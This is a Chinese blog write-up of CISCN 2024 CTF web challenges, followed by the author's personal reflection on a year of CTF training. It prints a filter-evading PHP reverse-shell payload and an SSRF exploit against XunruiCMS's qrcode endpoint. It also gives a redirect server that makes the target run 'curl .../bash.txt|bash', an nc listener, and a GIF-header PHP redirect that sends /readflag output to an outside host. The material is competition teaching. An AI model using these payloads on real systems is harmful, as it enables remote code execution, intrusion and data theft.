---
title: "2024ciscnWeb题解及一些思考"
date: 2024-05-21
categories: 比赛记录
tags: ciscn
top_img: false
---
# Web

## Simple\_PHP

过滤了很多东西，首先尝试参数逃逸不太成功。

然后发现它ban的大多数是查看文件的，和它杠到底，base32没过滤干净，可以读文件，但是.?\*这种通配符被ban了，不太好描述文件啊。

考虑反弹shell，通过拼接构造：

```php
 <?php 	
	$c=array_keys(localeconv())[3][0]; 	
	$h=array_keys(localeconv())[1][1]; 	
	$r=array_keys(localeconv())[2][6]; 	
	$f=join(null,array($c,$h,$r)); 	
	system(join(null,array( $f(98),$f(97),$f(115),$f(104),$f(32),$f(45),$f(99),$f(32),$f(34),$f(98),$f(97),$f(115)     )));//通过这种方式构造命令，我删了后半截有关我vps的ip的部分 
```

获得shell之后没找到flag文件，看一下内网环境：`ss -tuln`

发现有3306端口开着，flag藏在里面。

使用mysql -u root -p root登录

SHOW DATABASES;

USE PHP\_CMS;

SELECT \* FROM F1ag\_Se3Re7;

获得flag。

最蛋疼的还是登录mysql执行命令无回显，等你退出之后回显才会出来。。。。

## esaycms

迅睿cms，结合提示考虑ssrf。

搜一下公开情报可以发现：[迅睿CMS漏洞公示,四川迅睿云软件开发有限公司厂商的漏洞列表 (xunruicms.com)](https://www.xunruicms.com/bug/)

``` CNVD-C-2022-423202	2022-08-17	4.5.6	已修复	中危	qrcode存在SSRF漏洞，需开启Redis服务 ```

有了一个大概的方向，然后提示说可以找源码。

GitHub上确实搜到了源码，但是是官方发的，~~当时根本不敢确定这个是不是题目要让我审的~~

在helper.php中能发现调用方法：

` index.php?s=api&c=api&m=qrcode&thumb='.urlencode($thumb).'&text='.urlencode($text).'&size='.$size.'&level='.$level `

这里面的thumb就是我们要插入的链接了，Api.php中的qrcode()函数会对$thumb调用dr\_catcher\_data()函数，而这个函数会对传入的url执行curl从而ssrf。

所以打通的payload如下：``` /index.php?s=api&c=api&m=qrcode&thumb=http://x.x.x.x:xxxx/redirect&text=1&size=1&level=1 ```

本机python3启动下面这个脚本提供redirect功能：

```python
from http.server import BaseHTTPRequestHandler, HTTPServer  
class MyHandler(BaseHTTPRequestHandler):     
    def do_GET(self):         
        if self.path == '/redirect':             
            self.send_response(302)             
            self.send_header('Location', 'http://127.0.0.1/flag.php?cmd=curl https://x.x.x.x:xxxx/bash.txt|bash')             
            self.end_headers()         
        else:             
            self.send_response(404)             
            self.end_headers()             
            self.wfile.write(b'404 Not Found')  
            
    def run(server_class=HTTPServer, handler_class=MyHandler, port=3306):     			server_address = ('', port)     
    	httpd = server_class(server_address, handler_class)     
        print(f'Starting server on port {port}...')     
        httpd.serve_forever()  

        
if __name__ == '__main__':     run()
```

同时vps上也要提供一个http服务器来供它获取bash.txt `python3 -m http.server`

最后是为了反弹shell监听的端口 `nc -lvp xxxx`

拿到shell后去根目录执行./readflag

## easycms\_revenge

和上面的题一样的payload，但是能访问到自己的靶机（能出网）却并不能访问到提供bash.txt的http服务器。

尝试ping了一下自己也是ping不通，以为是curl和ping都被ban了。

以下为学习[第十七届全国大学生信息安全竞赛CISCN线上赛部分Writeup - NYNUSEC](https://www.nynusec.com/post/1001/)复现

看了wp才知道会检测图片头。。。。比赛的时候想比较两个题目的不同，但是开一个另一个就关了，加上自己心态比较急，没有get到题目中“此图片不是一张可用的图片”这个提示的含义，还是题做少了，思路太局限啦。伪造文件头单拎出来也会，但是没有get到这个脑洞。

需要给重定向文件伪造文件头：

 ``` GIF89a <?php header("Location: http://127.0.0.1/flag.php?cmd=curl http://x.x.x.x:8000/`/readflag | base64`"); exit(); ?> ```

伪造GIF头就让它以为是图片了。

不知为何，上一题的反弹shell方法死活弹不上，所以换了这种外带数据的方式。

对于不在本文件夹的可执行文件只需要在它前面加上路径就可以执行了。

# Misc

## 火锅

下载它需要的插件，然后答题，答对七次（不能重复）就给flag了。

# 后记

 一转眼接触ctf将近一年整。23年的5月第一次参加spirit校赛，只懂一点html的菜鸡勇闯Web，结果自然是铩羽而归；记得那天的茶歇很好吃，但是签到都差点没有签上，是一个响应包响应头有flagbase64编码的究极签到题。6月底抑或是7月初，暑假开始，我也正式开始学习web的旅程，同时打了西电等校的新生赛，那次的Web压轴题是一个简单的内网渗透，却让我感受到了现实世界中进行渗透的魅力，以及拿下一台主机那种难以言表的兴奋；当时好像只练过本地环境的反弹shell，导致尝试反弹的时候往局域网ip弹，还疑惑了一下午为什么弹不上，最终在本校师傅和出题师傅的帮助下才解决这些问题。开学之后打了一些新生赛，同时再次参加了spirit的校赛，这次不再爆零，但也只是做出了两道平平无奇的easy题，第三题是在js脚本中的jsfuck编码，并不困难，只是做题时焦急的心态放过了这个点子，错失flag；参加完这次校赛后成功进队，但深感自己代码能力和web技术都很差，主线任务变成了写cs144穿插学web，感到自己进入了一种看wp差不多，自己做却做不出来的瓶颈期，手也变得懒了，随队打了些网络赛不过输出都一般。寒假期间因为自己心态原因和一些家庭因素没怎么学习，完全没有暑假那种学web的热情和冲劲。开学之后，也就是现在这个学期，一边刷cs61b一边学web，也打了一些比赛，长城杯爆零，校赛输出了一些。常常觉得自己这种web安全纯混子一定是找不到工作的吧，毕竟coding能力只能算半吊子也反感去背八股卷开发，web安全上只能说略懂，算不上精通；却又时常幻想哪家公司眼瞎，说不定也会收留自己；转折点在今年五一，过于现实的外力因素让我明确了就是自己就是欠缺很多的事实，摆脱了过去那种鸵鸟心态：只要把头埋进“找工作”的沙堆里就可以麻痹自己得过且过，尝试去考研给自己一个新的学习机会；上周末的国赛可能是大学期间最后一次参赛，带着无所谓、享受比赛的心态，却有了自己生涯最好的发挥，当周日下午做出第一天的cms却被第二天的cms卡住时仿佛有种解脱的快感，冥冥之中仿佛有人告诉我你尽力了，但是水平也确实就到这里。

 我算不上很有天赋或者很勤奋的web手，在这短短一年的时间里经常因为自己易碎的心态而错失良机，瓶颈期也时常怀疑自己对安全的热情究竟存不存在。悟已往之不谏，知来者之可追，回忆自己最初接触ctf的时候，深感对于计算机的了解太少只会刷刷算法题，这才选择了web这个知识面很广的方向；纵使现在有这样那样的困扰，也该守住学习知识的初心。

 由于考研开始的较晚，今年可能不会再有什么文章更新了，不过再见不是永别。青山不改，绿水长流，咱们后会有期